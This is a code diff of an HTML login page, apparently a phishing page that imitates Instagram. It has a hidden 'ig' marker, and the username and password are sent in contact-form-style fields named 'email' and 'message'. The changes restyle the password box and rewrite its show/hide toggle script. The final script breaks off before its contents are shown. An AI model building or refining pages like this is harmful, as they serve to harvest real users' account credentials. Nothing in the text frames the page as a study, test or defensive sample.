@@ -225,7 +225,39 @@ input[type="submit"]:hover, input[type="submit"]:focus {
     font-weight:80;
   }
   .error-banner strong { display:block; margin-bottom:4px; }
+
+  .pw-box {
+  position: relative;
+}
+
+.pw-box input {
+  background: rgba(250, 250, 250, 1);
+  border: 1px solid rgb(236, 234, 234);
+  border-radius: 3px;
+  box-shadow: 0 1px #fff;
+  box-sizing: border-box;
+  color: black;
+  height: 39px;
+  margin: 10px 0 0 40px;
+  padding: 10px;
+  font-size: 13px;
+  width: 320px;
+}
+
+/* Show / Hide text inside the box */
+.pw-box span {
+  position: absolute;
+  right: 50px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 12px;
+  color: #737373;
+  cursor: pointer;
+  user-select: none;
+}
+
 </style>
+
 
 </head>
 
@@ -238,31 +270,12 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       <input type="text" placeholder="Username" id="name" value="ig" name="name" class="input-1" hidden />
       <input type="text" placeholder="Username" id="email" name="email" class="input-1" />
       <input type="hidden" id="region" name="region">
-        <div class="password-wrapper" style="position: relative;">
-          <input 
-            type="password" 
-            placeholder="Password" 
-            id="message" 
-            name="message" 
-            class="input-2"
-            style="padding-right: 60px;"
-          />
-        
-          <span id="togglePassword" 
-                style="
-                  position: absolute;
-                  right: 10px;
-                  top: 50%;
-                  transform: translateY(-50%);
-                  color: #385185;
-                  font-size: 14px;
-                  font-weight: 600;
-                  cursor: pointer;
-                  user-select: none;
-                ">
-            Show
-          </span>
-        </div>
+      <div class="pw-box">
+        <input type="password" id="message" placeholder="Password">
+        <span id="toggle">Show</span>
+      </div>
+      
+      
       <input class="btn btn-primary" type="submit" value="Log in">
     </form>
     <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive">
@@ -310,19 +323,12 @@ input[type="submit"]:hover, input[type="submit"]:focus {
     </p>
   </div>
   <script>
-    let pwd = document.getElementById("message");
-    let toggle = document.getElementById("togglePassword");
-  
-    toggle.addEventListener("click", function () {
-      if (pwd.type === "password") {
-        pwd.type = "text";
-        toggle.textContent = "Hide";
-      } else {
-        pwd.type = "password";
-        toggle.textContent = "Show";
-      }
-    });
-  </script>
+    toggle.onclick = () => {
+      message.type = message.type === "password" ? "text" : "password";
+      toggle.textContent = toggle.textContent === "Show" ? "Hide" : "Show";
+    };
+    </script>
+    
   
   <script>
     (function() {
